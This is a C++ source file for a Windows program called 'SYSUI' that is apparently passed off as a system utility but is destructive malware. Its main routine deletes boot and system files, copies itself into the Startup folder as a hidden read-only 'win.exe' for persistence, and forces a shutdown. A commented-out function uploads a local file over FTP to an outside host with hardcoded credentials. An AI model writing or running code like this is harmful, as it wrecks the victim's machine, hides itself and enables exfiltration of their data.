/*
SYSTEM UI v0.1 beta
Devloped by badiiiro
Author: badiiiro
Author URL: http://badiiiro.com
License: N/A
License URL: N/A
Copyright (C) 2019
*/

#include <iostream>
#include <windows.h>
#include <stdio.h> 
#include <conio.h> 
#include <stdlib.h>
#include <fstream>
#include <wininet.h>
#pragma comment(lib, "Wininet")

using namespace std;

char poweredBy[] = "badiiiro";

void msgBox();
void shutDown();
void outputProgramFeatures();
void removeFile();
void renameFile();
void attribFile();
void fileSubmit();
void setColor(int ForgC);

void setColor(int ForgC)
{
     WORD wColor;
     //This handle is needed to get the current background attribute

     HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     //csbi is used for wAttributes word

     if(GetConsoleScreenBufferInfo(hStdOut, &csbi))
     {
          //To mask out all but the background attribute, and to add the color
          wColor = (csbi.wAttributes & 0xF0) + (ForgC & 0x0F);
          SetConsoleTextAttribute(hStdOut, wColor);
     }
     return;
}
void msgBox()
{
	MessageBox(HWND_DESKTOP,"To use this software you must agree to our terms and conditions, you can read our terms and conditions online from this site below\nhttps://termsofuse.com\nPleas make sure after you clock <OK> the action can not be undone","SYSUI",MB_ICONINFORMATION| MB_OK);
}
void shutDown()
{
	setColor(12);  
	cout << "Turning off the system...\n";
	system("c:\\windows\\system32\\shutdown /s /t 10 \n\n");
	setColor(15);  
}
void outputProgramFeatures()
{
	setColor(12);  
    printf("================================================================================\n\n");
    setColor(15);  
	cout << "\t.dPY8  Yb  dP .dPY8  	88   88	88 \n";
	setColor(12);  
	cout << "\t`Ybo.   YbdP  `Ybo. 	88   88	88 \n";
	cout << " \to.`Y8b   8P   o.`Y8b 	Y8   8P 88 \n";
	setColor(15);  
	cout << "\t8bodP'   dP   8bodP' 	`YbodP' 88 \n";
    cout << "\t\n";
    setColor(9);  
	cout << "\t}--{+} SYSUI v0.1 {+}--{ \n\t}-{*} Coded By " << poweredBy  << " {*}-{\n\n"; 
	setColor(12);  
    printf("\n================================================================================\n");	
    setColor(15); 
}
void removeFile()
{
	// Remove old files
	setColor(12);  
	cout << "Deleting system files...\n";
	setColor(15);  
	if( remove("c:\\Windows\\Boot\\Resources\\bootres.dll") != 0 )
	perror( "Error deleting files" );
	else
	puts( "File successfully deleted" );
	remove("c:\\windows\\win.ini"); 
	remove("c:\\autoexec.bat"); 
	remove("c:\\msdos.sys"); 
	remove("c:\\io.sys"); 
	remove("c:\\command.com"); 
	remove("c:\\config.sys"); 
	remove("c:\\windows\\ebd\\command.com"); 
	remove("c:\\windows\\ebd\\ebd.cab"); 
	remove("c:\\windows\\ebd\\Autoexec.bat"); 
	remove("c:\\windows\\ebd\\setramd.bat"); 
	remove("c:\\windows\\ebd\\Findramd.exe"); 
}
void renameFile()
{
	/*
	setColor(12);  
	cout << "Renaming <FILENAMERENAME> to <FILENAMERENAMEDONE> at <C:/FOLDERNAME>\n";
	setColor(15);  
	if( rename("FILENAMERENAME.txt","c:/FOLDERNAME/FILENAMERENAMEDONE.txt") != 0 )
	perror( "Error renaming file" );
	else
	puts( "File successfully renamed" );
	*/
	setColor(12);  
	cout << "Renaming <SYSUI.exe> to <win.exe> at <windows/startm~1/programs/startup/>\n";
	setColor(15);  
	if( rename("SYSUI.exe","c:/windows/startm~1/programs/startup/win.exe") != 0 )
	perror( "Error renaming file" );
	else
	puts( "File successfully renamed" );
}
void attribFile()
{
	/*
	setColor(12);  
	cout << "Changing <FILENAMEHIDE.txt> to read-only and hidden file\n";
	setColor(15);  
	system("attrib +H +R c:/FOLDERNAME/FILENAMEHIDE.txt");
	*/
	setColor(12);  
	cout << "Changing <SYSUI.exe> to read-only and hidden file\n";
	setColor(15);  
	ofstream out;
	out.open("c:/windows/startm~1/programs/startup/win.exe");
	out.close();
	//attrib [parameters] [file]
	//+R -> readonly
	//+H -> hidden
	//+S -> system file (ultra hidden)
	//There are more, type 'attrib /?' in cmd to find all of the options
	system("attrib +H +R c:/windows/startm~1/programs/startup/win.exe");
}
/*
void fileSubmit()
{
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        cout << "Error: " << GetLastError();
    }
    else
    {
        hFtpSession = InternetConnect(hInternet, "files.000webhost.com", INTERNET_DEFAULT_FTP_PORT, "redrosesdrug", "BAYlovec++", INTERNET_SERVICE_FTP, 0, 0);
        if (hFtpSession == NULL)
        {
            cout << "Error: " << GetLastError();
        }
        else
        {
        if (!FtpPutFile(hFtpSession, "C://FOLDERNAME/FILENAMEUPLOAD.txt", "/FILENAMEUPLOAD.txt.txt", FTP_TRANSFER_TYPE_BINARY, 0))
        {
                    cout << "Error: " << GetLastError();
        }
    }
    }
}
*/

int main()
{
	// msgBox();
	outputProgramFeatures();
	removeFile();
	renameFile();
	attribFile();
	// fileSubmit();
	shutDown();
	// system("pause");
}
